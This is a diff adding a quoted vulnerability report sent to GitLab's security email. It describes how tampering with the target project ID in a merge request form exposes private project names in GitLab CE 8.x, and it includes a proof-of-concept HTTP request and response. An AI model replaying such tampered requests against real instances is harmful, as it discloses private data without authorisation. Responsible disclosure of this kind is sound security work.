@@ -1,0 +1,39 @@
+'This vulnerability was reported via the `security@gitlab.com` email address. The email is shown below.
+
+>>>
+1 SUMMARY
+
+The Gitlab merge request feature allows to view the name of private projects to unpriviledged users.
+
+2 AFFECTED PRODUCTS
+
+The following Products have been tested as vulnerable so far:
+
+Gitlab-CE: 8.11.11, 8.16.1, 8.16.4
+
+3 DETAILS
+
+If the ID (numeric, incrementing) of a private project can be guessed by an attacker, he is able to see the name of the project in the merge request formular.
+To achieve this inconsistent state, one has to replace the project id of a merge request during the second form submission with the id of the private project.
+
+5 PROOF OF CONCEPT
+
+Request
+-------
+
+POST /foobar/public/merge_requests HTTP/1.0
+[...]
+utf8=[...]&authenticity_token=[...]&merge_request[title]=Update+README.md&merge_request[description]=&merge_request[lock_version]=&merge_request[source_project_id]=3&merge_request[source_branch]=master&merge_request[target_project_id]=<ID OF PRIVATE PROJECT>&merge_request[target_branch]=master
+
+
+Response
+--------
+
+HTTP/1.1 200 Ok
+[...]
+<button class="dropdown-menu-toggle js-compare-dropdown js-target-project" type="button" data-toggle="dropdown" data-field-name="merge_request[target_project_id]" data-disabled="false">
+<span class="dropdown-toggle-text ">root/private</span>
+<i class="fa fa-chevron-down"></i>
+</button>
+[...]
+>>>
